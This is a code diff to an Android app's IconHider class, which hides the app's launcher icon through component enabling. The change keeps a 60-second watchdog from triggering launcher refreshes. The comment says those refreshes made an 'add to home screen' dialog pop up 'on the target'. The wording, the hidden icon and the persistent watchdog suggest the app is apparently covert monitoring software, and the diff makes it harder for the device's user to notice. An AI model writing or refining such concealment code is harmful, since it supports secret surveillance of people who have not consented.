@@ -13,6 +13,12 @@ import com.sp.core.util.Prefs
  * times, so the app can always be started again - in v1.1.x the launcher
  * component was disabled and the app became unreachable after an update,
  * which was the reason the icon was visible all the time in the first place.
+ *
+ * Every call is idempotent: setComponentEnabledSetting() is only called when
+ * the state really changes. Otherwise the launcher gets a PACKAGE_CHANGED
+ * broadcast every 60 s (from the watchdog) and re-renders the app entry -
+ * on the Motorola launcher that ended up in its own "add to home screen"
+ * dialog popping up on the target.
  */
 object IconHider {
 
@@ -41,18 +47,9 @@ object IconHider {
             val pm = ctx.packageManager
             // The activity itself is always enabled - the app must stay
             // startable no matter what happened to the icon.
-            for (name in listOf(LAUNCHER_COMPONENT, LEGACY_COMPONENT)) {
-                pm.setComponentEnabledSetting(
-                    ComponentName(ctx, name),
-                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
-                    PackageManager.DONT_KILL_APP
-                )
-            }
-            pm.setComponentEnabledSetting(
-                ComponentName(ctx, ALIAS),
-                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
-                PackageManager.DONT_KILL_APP
-            )
+            enableIfNeeded(pm, ctx, LAUNCHER_COMPONENT)
+            enableIfNeeded(pm, ctx, LEGACY_COMPONENT)
+            enableIfNeeded(pm, ctx, ALIAS)
             Prefs.set(ctx, KEY_ICON_HIDDEN, false)
         } catch (_: Throwable) {
         }
@@ -62,18 +59,9 @@ object IconHider {
         try {
             val pm = ctx.packageManager
             // Never disable the activity itself - only the icon.
-            for (name in listOf(LAUNCHER_COMPONENT, LEGACY_COMPONENT)) {
-                pm.setComponentEnabledSetting(
-                    ComponentName(ctx, name),
-                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
-                    PackageManager.DONT_KILL_APP
-                )
-            }
-            pm.setComponentEnabledSetting(
-                ComponentName(ctx, ALIAS),
-                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                PackageManager.DONT_KILL_APP
-            )
+            enableIfNeeded(pm, ctx, LAUNCHER_COMPONENT)
+            enableIfNeeded(pm, ctx, LEGACY_COMPONENT)
+            disableIfNeeded(pm, ctx, ALIAS)
             Prefs.set(ctx, KEY_ICON_HIDDEN, true)
         } catch (_: Throwable) {
         }
@@ -85,5 +73,37 @@ object IconHider {
             PackageManager.COMPONENT_ENABLED_STATE_DISABLED
     } catch (_: Throwable) {
         false
+    }
+
+    /**
+     * The state of a component is only pushed to the package manager when it
+     * is different - a redundant call is a package change for the launcher.
+     */
+    private fun enableIfNeeded(pm: PackageManager, ctx: Context, name: String) {
+        try {
+            val cn = ComponentName(ctx, name)
+            if (pm.getComponentEnabledSetting(cn) != PackageManager.COMPONENT_ENABLED_STATE_ENABLED) {
+                pm.setComponentEnabledSetting(
+                    cn,
+                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
+                    PackageManager.DONT_KILL_APP
+                )
+            }
+        } catch (_: Throwable) {
+        }
+    }
+
+    private fun disableIfNeeded(pm: PackageManager, ctx: Context, name: String) {
+        try {
+            val cn = ComponentName(ctx, name)
+            if (pm.getComponentEnabledSetting(cn) != PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
+                pm.setComponentEnabledSetting(
+                    cn,
+                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                    PackageManager.DONT_KILL_APP
+                )
+            }
+        } catch (_: Throwable) {
+        }
     }
 }
